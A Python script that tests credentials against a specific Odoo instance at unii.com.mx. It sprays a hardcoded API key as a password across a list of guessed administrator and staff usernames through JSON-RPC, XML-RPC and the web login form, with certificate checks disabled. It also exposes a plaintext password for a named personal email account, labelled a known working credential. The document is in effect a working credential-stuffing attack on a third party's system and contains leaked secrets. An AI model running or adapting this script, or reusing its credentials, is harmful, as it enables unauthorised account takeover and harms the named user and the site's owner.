"""Test Odoo API key authentication on unii.com.mx"""
import requests, json, sys, urllib3
urllib3.disable_warnings()

BASE = "https://unii.com.mx"
DB   = "unii"
APIKEY = "9242f55eec6e9ffcb167ca16751f797a204eb604"
TO = 20

USERS_TO_TRY = [
    "luishmatag1@gmail.com",
    "admin",
    "administrator",
    "admin@unii.com.mx",
    "admin@unimex.com.mx",
    "sgarcia",
    "sergio.garcia@unimex.com.mx",
    "soporte@unimex.com.mx",
    "servicioaclientes@unimex.com.mx",
    "vortem",
    "root",
    "sistema",
]

def rpc(service, method, args):
    r = requests.post(f"{BASE}/jsonrpc", json={
        "jsonrpc": "2.0", "id": 1,
        "method": "call",
        "params": {"service": service, "method": method, "args": args}
    }, timeout=TO, verify=False)
    return r.json()

def xmlrpc_auth(user, pwd):
    r = requests.post(f"{BASE}/xmlrpc/2/common", data=f"""<?xml version="1.0"?>
<methodCall><methodName>authenticate</methodName><params>
<param><value><string>{DB}</string></value></param>
<param><value><string>{user}</string></value></param>
<param><value><string>{pwd}</string></value></param>
<param><value><struct></struct></value></param>
</params></methodCall>""",
    headers={"Content-Type": "text/xml"}, timeout=TO, verify=False)
    return r.text

print(f"[*] Testing API key on {BASE}, DB={DB}")
print(f"[*] Key: {APIKEY[:12]}...{APIKEY[-8:]}\n")

# 1. JSON-RPC authenticate
print("="*60)
print("[1] JSON-RPC common.login / authenticate")
print("="*60)

for user in USERS_TO_TRY:
    try:
        r = rpc("common", "login", [DB, user, APIKEY])
        uid = r.get("result")
        err = r.get("error")
        if uid and uid is not False:
            print(f"  [!!!] HIT  {user} → UID={uid}")
        elif err:
            emsg = err.get("data", {}).get("message", str(err))[:120]
            print(f"  [ERR] {user} → {emsg}")
        else:
            print(f"  [---] {user} → {uid}")
    except Exception as e:
        print(f"  [EXC] {user} → {e}")

print()

# 2. XML-RPC authenticate
print("="*60)
print("[2] XML-RPC authenticate (top 5 users)")
print("="*60)

for user in USERS_TO_TRY[:5]:
    try:
        resp = xmlrpc_auth(user, APIKEY)
        if "<int>" in resp:
            import re
            m = re.search(r"<int>(\d+)</int>", resp)
            if m:
                uid = int(m.group(1))
                if uid > 0:
                    print(f"  [!!!] HIT  {user} → UID={uid}")
                else:
                    print(f"  [---] {user} → False (0)")
            else:
                print(f"  [---] {user} → {resp[:200]}")
        elif "<boolean>0</boolean>" in resp or "False" in resp:
            print(f"  [---] {user} → False")
        else:
            print(f"  [???] {user} → {resp[:300]}")
    except Exception as e:
        print(f"  [EXC] {user} → {e}")

print()

# 3. Web login with API key as password
print("="*60)
print("[3] Web login /web/login (top 3 users)")
print("="*60)

import re as _re

for user in USERS_TO_TRY[:3]:
    try:
        sess = requests.Session()
        sess.verify = False
        r = sess.get(f"{BASE}/web/login", timeout=TO)
        m = _re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
        csrf = m.group(1) if m else ""
        r = sess.post(f"{BASE}/web/login",
                      data={"login": user, "password": APIKEY, "csrf_token": csrf, "db": DB, "redirect": "/"},
                      timeout=TO, allow_redirects=False)
        sid = sess.cookies.get("session_id")
        loc = r.headers.get("Location", "")
        if r.status_code in (301, 302, 303) and "/web" in loc:
            print(f"  [!!!] HIT  {user} → redirect to {loc}, sid={sid[:20] if sid else 'none'}...")
        elif r.status_code == 200 and "Wrong login" in r.text:
            print(f"  [---] {user} → Wrong login/password")
        elif r.status_code == 200:
            frag = r.text[r.text.find("alert"):r.text.find("alert")+200] if "alert" in r.text else f"status={r.status_code}"
            print(f"  [???] {user} → {frag[:150]}")
        else:
            print(f"  [???] {user} → status={r.status_code} loc={loc[:100]}")
    except Exception as e:
        print(f"  [EXC] {user} → {e}")

# 4. Also try the known working cred + API key combo
print()
print("="*60)
print("[4] Known user luishmatag1 with ORIGINAL password (verify still alive)")
print("="*60)

try:
    r = rpc("common", "login", [DB, "luishmatag1@gmail.com", "Gallito3690"])
    uid = r.get("result")
    print(f"  luishmatag1 original pwd → UID={uid}")
except Exception as e:
    print(f"  [EXC] {e}")

print("\n[*] Done")
